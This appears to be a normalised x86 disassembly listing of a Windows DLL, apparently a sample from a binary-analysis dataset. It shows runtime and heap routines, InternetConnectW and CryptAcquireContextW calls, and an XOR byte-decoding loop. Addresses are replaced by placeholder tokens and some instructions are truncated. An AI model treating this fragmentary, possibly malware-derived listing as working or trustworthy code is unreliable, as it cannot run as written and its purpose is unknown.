call sub_1000c1ce
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ edi ] 0x1
add esi 0x8
push esi
push 0x0
push 0x30
call sub_1003088d
xor esi esi
add esp 0xc
movzx ebx ax
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] 0x0
push [ ebp - 0x1c ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10027f70
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
or [ edi ] 0x2
jmp r-xdata
cmp [ eax ] bx
jb r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_1000aecf
mov eax ebx
call sub_1004fa89
retn 0x24
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_1003f510
jmp r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp esi [ ebp - 0x1c ]
jb r-xdata
movzx eax [ eax ]
lea ecx [ ebx + 0x9 ]
cmp ecx eax
jge r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
mov al [ eax + esi * 2 ]
sub al bl
add al 0x30
movzx eax al
push eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1003f510
inc esi
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x4c ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x4c ] ebx
call sub_1003c6eb
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x48 ]
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] ebx
jne r-xdata
mov eax [ ebp - 0x50 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10041a20
mov ebx [ ebp - 0x58 ]
sub_100054c2
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
leave
retn
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_1006a508
mov esi [ ebp - 0x14 ]
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
mov eax 0x100
push 0x1
cmp [ ebp + 0x8 ] ax
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
lea edx [ ebp - 0x4 ]
push edx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
push eax
push ecx
call sub_10022837
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push [ ebp + 0x8 ]
call sub_10065abd
pop ecx
test eax eax
movzx eax [ ebp + 0x8 ]
pop ecx
je r-xdata
movzx eax ax
jmp r-xdata
add ax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ esi + 0xcc ]
movzx eax [ ecx + eax ]
jmp r-xdata
pop esi
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10005570
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
push esi
call sub_1002a0a0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10005590
push ebp
mov ebp esp
push 0xffffffff
push sub_100822f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
push 0x0
mov esi ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push eax
call sub_1004d9c0
jmp r-xdata
push esi
mov ecx ebx
call sub_1001ebe0
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x64 ]
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x64 ] 0x0
call sub_1003b340
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x68 ]
test edx edx
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x64 ]
test esi esi
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x41
call sub_10013830
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x64 ]
test esi esi
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor eax eax
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax 0x2
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10005700
push ebp
mov ebp esp
push 0xffffffff
push sub_1008260a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0xffffffff
lea ecx [ edi + 0x4 ]
push esi
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] esi
push eax
mov [ ecx ] dx
call sub_10019180
mov [ ebp - 0x4 ] esi
lea esi [ edi + 0x20 ]
mov [ esi ] r--data
mov [ esi + 0x10 ] r--data
mov [ ebp + 0xc ] esi
mov [ esi + 0x60 ] r--data
mov eax 0x1
lea ebx [ esi + 0x18 ]
push ebx
mov [ ebp - 0x4 ] al
push esi
mov [ ebp - 0x10 ] eax
call sub_10061b50
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
push ebx
mov [ esi + edx ] r--data
call sub_10040000
xor eax eax
mov [ ebx + 0x3c ] eax
mov [ ebx + 0x40 ] eax
mov [ ebx ] r--data
mov [ edi + 0xc8 ] eax
mov [ edi + 0xcc ] eax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_100057d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f0ab
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x18 ]
mov ecx [ ecx ]
push 0x1
push eax
mov eax [ ebp + 0x14 ]
push 0x3
push edx
mov edx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push edx
push eax
push ecx
call [ InternetConnectW@IAT ]
xor edx edx
mov esi eax
test esi esi
setne dl
push edx
call sub_10051250
add esp 0x4
test esi esi
je r-xdata
xor eax eax
push 0x4
call sub_10055606
add esp 0x4
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push esi
mov ecx eax
call sub_1002ed30
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_10005862
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp eax 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
add eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_1004937a
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1006b64d
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1006b64d
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax edi
sub_10005940
push ebx
mov ebx [ esi + 0x4 ]
push edi
xor edi edi
test ebx ebx
je r-xdata
mov eax [ esi ]
pop edi
pop ebx
test eax eax
je r-xdata
jmp r-xdata
retn
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi ] 0x0
mov eax [ esi ]
cmp [ eax + edi * 4 ] 0x0
lea eax [ eax + edi * 4 ]
je r-xdata
dec [ esi + 0x4 ]
inc edi
cmp edi ebx
jb r-xdata
mov ecx [ eax ]
push ecx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ esi ]
mov [ edx + edi * 4 ] 0x0
sub_1000599d
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10005ef0
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x30 ] edx
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] edx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] 0x1
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x2e
call sub_100050e0
mov eax edi
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x25
call sub_100050e0
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
push ecx
push ebx
push eax
mov [ esi + 0x4 ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] edi
lea edx [ ebp - 0x28 ]
mov eax 0x67
call sub_100050e0
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x34 ]
push ebx
push ecx
push eax
mov [ esi + 0x8 ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x64
call sub_100050e0
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x2c ]
push ebx
push ecx
push eax
mov [ esi + 0xc ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] edi
mov ebx [ ebp - 0x2c ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x2f
call sub_100050e0
push eax
call sub_10055686
add esp 0x4
mov [ esi + 0x10 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x30 ]
push ebx
push ecx
push eax
mov [ esi + 0x1c ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x1c ] edi
mov ebx [ ebp - 0x30 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0x3c ]
cmp eax edi
pop edi
pop ebx
je r-xdata
push eax
call sub_10055686
add esp 0x4
mov [ esi + 0x14 ] eax
mov eax [ ebp - 0x40 ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0x44 ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10024145
mov esp ebp
pop ebp
retn 0x14
push eax
call sub_10055686
add esp 0x4
mov [ esi + 0x18 ] eax
sub_100060d5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
push 0x16
pop eax
pop ebp
retn
sub_10006102
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi ecx
mov [ ecx ] 0x0
jmp r-xdata
test edi edi
je r-xdata
inc esi
dec edi
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] 0x0
call sub_1004fd6f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ edx ]
mov [ esi + edx ] al
inc edx
test al al
je r-xdata
call sub_1001d849
mov eax esi
jmp r-xdata
sub_1000616f
push ebp
mov ebp esp
push 0x8
push 0x1
push r--data
push 0x0
push [ ebp + 0x8 ]
call [ CryptAcquireContextW@IAT ]
neg eax
sbb eax eax
and eax 0xfffffffe
add eax 0x2
pop ebp
retn 0x4
sub_10006194
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1007c1cc
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100061e0
push ebp
mov ebp esp
sub esp 0xcc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov ecx 0x3
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0x1c ] cx
mov ecx [ r--data ]
mov [ ebp - 0xc4 ] esi
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xc0 ] eax
lea edx [ eax + 0x1 ]
jmp r-xdata
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0xff8b
and ebx 0xff
mov [ ebp + eax * 2 - 0x4c ] bx
inc eax
cmp eax 0x7
jb r-xdata
mov ebx [ ebp - 0x1c ]
mov ecx [ esi + 0x1c ]
xor eax eax
mov [ ebp - 0x3e ] ax
mov esi [ ecx ]
